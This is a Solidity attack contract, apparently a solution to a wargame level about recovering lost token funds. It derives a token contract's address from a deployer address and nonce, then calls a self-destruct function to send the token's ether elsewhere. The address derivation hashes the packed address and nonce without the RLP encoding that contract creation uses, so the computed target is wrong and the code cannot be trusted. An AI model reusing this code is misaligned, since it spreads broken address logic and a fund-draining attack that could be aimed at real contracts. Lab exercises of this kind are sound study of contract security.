pragma solidity ^0.8.0;

contract FinalAttack {
    address public targetToken;
    address private recovery = 0xa16E02E87b7454126E5E10d957A927A7F5B5d2be;
    address private factory = 0x5FbDB2315678afecb367f032d93F642f64180aa3;

    constructor() {
        // Calculate the address of the SimpleToken deployed from Recovery with nonce 1
        targetToken = computeAddress(recovery, 1);
    }

    function computeAddress(address a, uint8 n) private pure returns (address) {
        bytes32 hash = keccak256(abi.encodePacked(a, n));
        return address(uint160(uint256(hash)));
    }

    function destroyToken() external {
        // Call destroy with the factory address as the recipient
        (bool success, ) = targetToken.call(abi.encodeWithSelector(0x87335b7a, payable(factory)));
        require(success, "Destroy failed");
    }
}
